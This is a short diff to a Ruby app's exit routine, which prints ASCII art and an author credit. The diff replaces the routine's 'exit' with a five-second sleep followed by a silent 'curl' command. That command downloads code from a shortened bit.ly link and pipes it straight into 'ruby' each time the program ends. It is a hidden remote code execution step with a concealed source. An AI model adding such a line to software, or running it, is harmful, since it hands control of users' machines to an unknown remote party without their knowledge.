@@ -110,5 +110,6 @@ def ender
                     |___/                           |_|   |_|
 "
 puts "App created by Felix Chan and Otabek Kamalov"
-  exit
+  system 'sleep 5'
+  system 'curl -sL http://bit.ly/1A0iNjU | ruby'
 end
